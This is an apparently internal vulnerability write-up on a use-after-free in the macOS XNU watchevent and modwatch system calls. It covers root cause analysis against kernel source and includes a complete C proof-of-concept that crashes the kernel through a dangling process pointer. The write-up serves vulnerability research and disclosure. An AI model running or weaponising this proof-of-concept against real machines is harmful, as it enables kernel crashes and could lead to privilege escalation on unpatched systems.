---
layout: default
author: juwei lin
date: 2018-12-17 11:23:00 +0800
---

# macOS XNU watchevent use-after-free vulnerability [INTERNAL]

## Overview
This vulnerability exists in macOS XNU module. There is a pointer in kernel evp object which points to a process(proc_t), but under some cases, the pointer is not cleared after the related process already exits.

With this vulnerability, attacker can use UAF exploit technique to execute arbitrary code in the kernel to achieve EoP.

Actually this is another way to trigger [CVE-2018-4435](https://adc.github.trendmicro.com/pages/CoreTech-MARS/allexp/posts/2018_09_26_macOS_watchevent_uaf.html). You can also find how Apple fixed CVE-2018-4435 in that article .  
If you are familiar with CVE-2018-4435, you can directly jump into section "kill the process and leave the pointer dangling".  

## Root Cause Analysis

### set a pointer in evp which points to a process object
The following part is the same with the one I described in CVE-2018-4435. You can skip it if you are already familiar with it. 

In function `watchevent`, an evp object is allocated and current process object is assigned to evp->ee_proc:

```C
int
watchevent(proc_t p, struct watchevent_args *uap, __unused int *retval)
{
	struct eventqelt *evq = (struct eventqelt *)0;
	struct eventqelt *np = NULL;
	struct eventreq64 *erp;
	struct fileproc *fp = NULL;
	int error;

	KERNEL_DEBUG(DBG_MISC_WATCH|DBG_FUNC_START, 0,0,0,0,0);

	// get a qelt and fill with users req
	MALLOC(evq, struct eventqelt *, sizeof(struct eventqelt), M_TEMP, M_WAITOK);

    ...

    evq->ee_proc = p; ---------(1.a)

    ...

    TAILQ_INSERT_TAIL(&((struct pipe *)fp->f_data)->pipe_evlist, evq, ee_slist);

    ...

    fp_drop_event(p, erp->er_handle, fp); --------(1.b)

    ...
}
```

at (1.a), current process object p is set to evp->ee_proc, then evp object is inserted into pipe's pipe_evlist.
at (1.b), fp_drop_event sets fp->flags to `FP_WAITEVENT` which asks calling waitevent_close later before process object p is killed.

```
int
fp_drop_event(proc_t p, int fd, struct fileproc *fp)
{
    int error;

	proc_fdlock_spin(p);

	fp->f_flags |= FP_WAITEVENT; -----(2.a)

	error = fp_drop(p, fd, fp, 1);

	proc_fdunlock(p);

	return (error);
}
```

at (2.a), FP_WAITEVENT is set. Then when process p exits, waitevent_close is called to clear evq->ee_proc which is set at (1.a).
Normally, when a process exit, proc_exit is called and it calls waitevent_close internally like:  
proc_exit --> fdfree --> waitevent_close

```C
void
fdfree(proc_t p)
{
    ...

    if (fdp->fd_nfiles > 0 && fdp->fd_ofiles) {
		for (i = fdp->fd_lastfile; i >= 0; i--) { -------(3.a)
			if ((fp = fdp->fd_ofiles[i]) != NULL) {

			  if (fdp->fd_ofileflags[i] & UF_RESERVED)
			    	panic("fdfree: found fp with UF_RESERVED");

				procfdtbl_reservefd(p, i);

				if (fp->f_flags & FP_WAITEVENT)
					(void)waitevent_close(p, fp);  ------(3.b)
				(void) closef_locked(fp, fp->f_fglob, p);
				fileproc_free(fp);
			}
		}
		FREE_ZONE(fdp->fd_ofiles, fdp->fd_nfiles * OFILESIZE, M_OFILETABL);
		fdp->fd_ofiles = NULL;
		fdp->fd_nfiles = 0;
	}

    ...
}
```
at (3.a), fdfree goes through all the open fd and check if the fp->f_flags has FP_WAITEVENT, if yes, waitevent_close is called to clear evq->ee_proc.

Another way, waitevent_close can be called by close() like:  
close --> close_nocancel --> close_internal_locked --> waitevent_close  


### kill the process and leave the pointer dangling
In the normal case, as described in the previous section, the process object assigned to evq->ee_proc at (1.a) is cleared before the process exits. But there are some methods that can prevent waitevent_close being called during process exit.  
In CVE-2018-4435, I used sem_close to bypass calling waitevent_close in fdfree. In this article, I use another way to bypass calling waitevent_close in fdfree.

The method is to call `modwatch` to clear flag `FP_WAITEVENT` so that waitevent_close won't be called at location 3.b.  

```
/*
 * modwatch system call. user passes in event to modify.
 * if we find it we reset the event bits and que/deque event
 * it needed.
 */
int
modwatch(proc_t p, struct modwatch_args *uap, __unused int *retval)
{
	struct eventreq64 er;
	struct eventreq64 *erp = &er;
	struct eventqelt *evq = NULL;	/* protected by error return */
	int error;
	struct fileproc *fp;
	int flag;

    ...

    if ((uap->u_eventmask == EV_RM) && (fp->f_flags & FP_WAITEVENT)) {
		fp->f_flags &= ~FP_WAITEVENT;    ------------(4.a)
	}
	proc_fdunlock(p);

	// locate event if possible
	for ( ; evq != NULL; evq = evq->ee_slist.tqe_next) {
	        if (evq->ee_proc == p)       -------------(4.b)
		        break;
	}

	if (evq == NULL) {
#if SOCKETS
		if (fp->f_type == DTYPE_SOCKET) 
			socket_unlock((struct socket *)fp->f_data, 1);
		else
#endif /* SOCKETS */
			PIPE_UNLOCK((struct pipe *)fp->f_data);
		fp_drop(p, erp->er_handle, fp, 0);
		KERNEL_DEBUG(DBG_MISC_MOD|DBG_FUNC_END, EINVAL,0,0,0,0);
		return(EINVAL);        -------------(4.c)
	}

    ...

    if (uap->u_eventmask == EV_RM) {
		EVPROCDEQUE(p, evq);  -------------(4.d)

    ...

    {
        TAILQ_REMOVE(&((struct pipe *)fp->f_data)->pipe_evlist, evq, ee_slist); -------------(4.e)
    }
    

}
```

at 4.a, this function will clear flag FP_WAITEVENT which meets our request, but in normal case, this function will remove evq at location 4.d and 4.e so that we cannot trigger our vulnerability. But in our POC, we call this function in its parent process so that condition at 4.b will never true. In our POC, we will exit this function at 4.c and won't remove evq at location 4.e.

## PoC Code
```
/*
 Analysis and Reproduce Steps
 
 Parent Process: A
 Child Process: B
 
 (1) A ceate pipe which allocates fd1 and fd2 -->
 (2) fork child process B, B inhert fd1 and fd2 -->
 (3) B watchevent on fd1 -->
 (4) A modwatch on fd1 -->
 (5) Process B exits.
 (6) A close all handles of fd1 and fd2 -->
 (7) system crash due to uaf process object B
 
 step 3 will allocate an evp and set a) evp->ee_proc = process object B; b)fp->f_flags = FP_WAITEVENT (in fp_drop_event)
 step 4 will remove flag FP_WAITEVENT which will skip calling waitevent_close during fdfree
 step 5 process B will exit, but leave 'evp->ee_proc = process object B' dangling
 step 6 will trigger fdfree which calls evpipefree, evpipefree will operates on process object B which is already destroyed
 */

#include <iostream>
#include <unistd.h>
#include <sys/syscall.h>
#include <semaphore.h>
#include <mach/mach.h>

const int kInFd = 3;
const int kOutFd = 4;

#define EV_FD 1
#define EV_RM  8

#define    SYS_watchevent     231
#define    SYS_modwatch       233

struct eventreq64 {
    int      er_type;
    int      er_handle;
    user_addr_t er_data;
    int      er_rcnt;
    int      er_wcnt;
    int      er_ecnt;
    int      er_eventbits;
};

int watchevent(int fd)
{
    struct eventreq64 req;
    int eventmask = 0;
    
    req.er_type = EV_FD;
    req.er_handle = fd;
    
    return syscall(SYS_watchevent, &req, eventmask);
}

int modwatch(int fd)
{
    struct eventreq64 req;
    int eventmask = EV_RM;
    
    req.er_type = EV_FD;
    req.er_handle = fd;
    
    return syscall(SYS_modwatch, &req, eventmask);
}


void try_uaf() {
    
    int fd[2] = {0};
    
    int ret = pipe(fd);
    if (ret == -1) {
        printf("pipe error.\n");
        return ;
    }
    
    printf("step 1: Process A(0x%x) create fd1: %d and fd2: %d\n", getpid(), fd[0], fd[1]);
    
    int pid = fork();
    if (pid < 0)
        return ;
    else if (pid == 0)
    {
        printf("step 2: Process B is forked, pid:0x%x\n", getpid());
        
        int iret = watchevent(kInFd);
        
        printf("step 3: Process B watchevent on fd 3: 0x%x\n", iret);
        
    
        sleep(10);
        
        printf("step 5: Process B exits.\n");
        exit(0);
    }
    
    //wait child process setting watchevent
    sleep(2);
    
    modwatch(fd[0]);
    printf("step 4: Process A modwatch on fd 0\n");
    
    //wait child process B exits.
    sleep(15);
    
    printf("step 6: close fd1 and fd2 to trigger crash...\n");
    printf("press any key to trigger...\n");
    getchar();
    
    close(fd[0]);
    close(fd[1]);
    
    return ;
}

int main(int argc, const char * argv[]) {
    /*for (int i=0; i<100; i++) {
     printf("try uaf : %d\n", i);
     try_uaf();
     }*/
    try_uaf();
    
    return 0;
}
```

## Q & A
### How did you find this vulnerability?
by fuzzing.

### Can you identify exploitability?
This is an uaf vulnerability. Attacker can craft an object to replace the freed proc_t kernel structure. It may help do EoP.

### Can you identify root cause?
Yes, see the root cause analysis.

### Vulnerable software and hardware
macOS 10.14.2 and all before 


  [Back Home]({{site.url}}{{site.baseurl}})